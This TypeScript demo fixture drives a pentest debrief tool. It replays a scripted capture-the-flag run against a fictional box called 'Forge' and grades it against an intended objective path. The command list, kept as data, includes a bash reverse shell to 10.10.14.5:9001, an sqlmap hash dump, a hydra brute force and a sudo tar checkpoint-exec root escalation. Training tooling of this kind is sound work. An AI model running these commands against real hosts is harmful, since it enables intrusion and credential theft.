/**
 * A scripted end-to-end playthrough of a fictional box ("Forge"), used to demo the debrief live —
 * DemoDriver streams these commands into the store one at a time, recording: true, so you can watch
 * the report build (phase advancing, stealth burning, flags landing) exactly as a real capture would,
 * then resolve into the final graded debrief. No box, no capture agent, browser-only.
 *
 * Timings are realistic (a ~30-minute run); the driver reveals one command every ~1.5s, so it's a
 * time-compressed replay. Tactics follow the real classifier, and the golden path is authored so the
 * alignment resolves to 9/10 objectives (one skipped — the cron check) for a believable comparison.
 */
import type { GoldenObjective, Session, WatcherReport } from "../../types/report";
import type { RawCommand } from "../pipeline/types";
import { assembleReport } from "../pipeline/ingest";

const START = Date.parse("2026-06-01T20:00:00Z");

interface Step {
  cmd: string;
  gap: number; // think-time before (ms)
  dur: number; // machine time (ms)
  out: string;
  lines: number;
  volume?: number; // request/line count → noise scaling
}

const STEPS: Step[] = [
  { cmd: "nmap -sV -sC -oN scan 10.10.11.42", gap: 2_000, dur: 45_000, lines: 42, volume: 1000, out: "22/tcp ssh OpenSSH 8.2 · 80/tcp http Apache 2.4.41 (forge.htb)" },
  { cmd: "gobuster dir -u http://forge.htb -w /usr/share/wordlists/dirb/common.txt", gap: 55_000, dur: 34_000, lines: 210, volume: 4614, out: "/uploads (301) · /admin (301) · /api (200)" },
  { cmd: "nikto -h http://forge.htb", gap: 30_000, dur: 42_000, lines: 180, volume: 2600, out: "Apache 2.4.41 · /admin exposed · 3 security headers missing" },
  { cmd: "curl -s http://forge.htb/api/", gap: 22_000, dur: 1_200, lines: 3, out: '{"endpoints":["/api/user","/api/login"]}' },
  { cmd: "hydra -l admin -P rockyou.txt forge.htb http-post-form", gap: 35_000, dur: 26_000, lines: 90, volume: 1900, out: "16 of 16 targets completed, 0 valid passwords found — dead end" },
  { cmd: "sqlmap -u 'http://forge.htb/api/login' --data 'u=x&p=y' --batch --dump", gap: 20_000, dur: 88_000, lines: 320, volume: 3100, out: "parameter 'u' is injectable (boolean-blind) · dumped users: admin:$2b$10$… svc:$2b$10$…" },
  { cmd: "curl -s http://forge.htb/api/user?id=1", gap: 28_000, dur: 1_400, lines: 2, out: '{"id":1,"user":"admin","role":"admin"} — revisiting the app from creds' },
  { cmd: "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1", gap: 55_000, dur: 2_000, lines: 1, out: "www-data@forge:/var/www$ — reverse shell landed" },
  { cmd: "whoami", gap: 20_000, dur: 400, lines: 1, out: "www-data" },
  { cmd: "id", gap: 4_000, dur: 400, lines: 1, out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)" },
  { cmd: "./linpeas.sh", gap: 25_000, dur: 62_000, lines: 540, volume: 300, out: "SUID/interesting: sudo -l → (root) NOPASSWD: /usr/bin/tar · writable /opt/scripts" },
  { cmd: "find / -perm -4000 -type f 2>/dev/null", gap: 40_000, dur: 8_000, lines: 24, out: "/usr/bin/tar · /usr/bin/passwd · /usr/bin/sudo · /usr/bin/mount" },
  { cmd: "getcap -r / 2>/dev/null", gap: 18_000, dur: 6_000, lines: 12, out: "/usr/bin/python3.8 = cap_setuid+ep (noted, not needed)" },
  { cmd: "cat /home/svc/user.txt", gap: 30_000, dur: 400, lines: 1, out: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6" },
  { cmd: "sudo -l", gap: 360_000, dur: 500, lines: 3, out: "User www-data may run the following: (root) NOPASSWD: /usr/bin/tar" },
  { cmd: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", gap: 90_000, dur: 1_800, lines: 1, out: "# id → uid=0(root) (GTFOBins: tar)" },
  { cmd: "cat /root/root.txt", gap: 18_000, dur: 400, lines: 1, out: "f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1" },
];

/** The scripted commands as RawCommands with cumulative, realistic timestamps. */
export const DEMO_RAW: RawCommand[] = (() => {
  let t = START;
  return STEPS.map((s) => {
    t += s.gap;
    const started = t;
    t += s.dur;
    return {
      cmd: s.cmd,
      started_at_ms: started,
      ended_at_ms: t,
      exit_code: 0,
      output_line_count: s.lines,
      output_digest: s.out,
      context_path: "host",
      ...(s.volume ? { volume: s.volume } : {}),
    } satisfies RawCommand;
  });
})();

const DEMO_END = DEMO_RAW[DEMO_RAW.length - 1].ended_at_ms;

export const DEMO_SESSION: Session = {
  uuid: "demo-forge-0001-0001-000000000001",
  started_at: new Date(START).toISOString(),
  ended_at: new Date(DEMO_END).toISOString(),
  target_scope: "HTB :: Forge",
  context_path: "host",
  shell: "bash",
  source: "local_pty",
  machine: { name: "Forge", os: "Linux", difficulty: "Medium", retired: true },
};

/** Stable store id for the demo session (matches what the live driver streams into). */
export const DEMO_ID = `htb:${DEMO_SESSION.uuid}`;

/** The intended path from the (pretend) write-up. Authored so alignment resolves to 9/10 — the cron
 *  check (pspy) is never run, so it stays skipped and shows up in "What you'd do differently". */
export const DEMO_GOLDEN: GoldenObjective[] = [
  { objective: "enumerate_services", tactic: "TA0007", satisfied_by: ["nmap"] },
  { objective: "enumerate_web_content", tactic: "TA0007", satisfied_by: ["gobuster", "feroxbuster"], depends_on: ["enumerate_services"] },
  { objective: "exploit_sql_injection", tactic: "TA0001", satisfied_by: ["sqlmap"], depends_on: ["enumerate_web_content"] },
  { objective: "get_foothold", tactic: "TA0002", satisfied_by: ["bash reverse shell", "nc"], depends_on: ["exploit_sql_injection"] },
  { objective: "enumerate_privesc", tactic: "TA0004", satisfied_by: ["linpeas", "linpeas.sh"], depends_on: ["get_foothold"] },
  { objective: "check_cron_jobs", tactic: "TA0004", satisfied_by: ["pspy", "pspy64"], depends_on: ["get_foothold"] },
  { objective: "capture_user_flag", tactic: "TA0004", satisfied_by: ["cat user.txt"], depends_on: ["get_foothold"] },
  { objective: "abuse_sudo_rule", tactic: "TA0004", satisfied_by: ["sudo -l"], depends_on: ["enumerate_privesc"] },
  { objective: "escalate_to_root", tactic: "TA0004", satisfied_by: ["sudo tar", "sudo"], depends_on: ["abuse_sudo_rule"] },
  { objective: "capture_root_flag", tactic: "TA0004", satisfied_by: ["cat root.txt"], depends_on: ["escalate_to_root"] },
];

/**
 * The fully-resolved demo report — the whole playthrough graded against the intended path. Pre-registered
 * in the store so a "Forge" card always shows in History; opening it replays the run live (see runLiveDemo).
 */
export const DEMO_REPORT: WatcherReport = {
  ...assembleReport(DEMO_RAW, { session: DEMO_SESSION, golden: DEMO_GOLDEN }),
  recording: false,
};
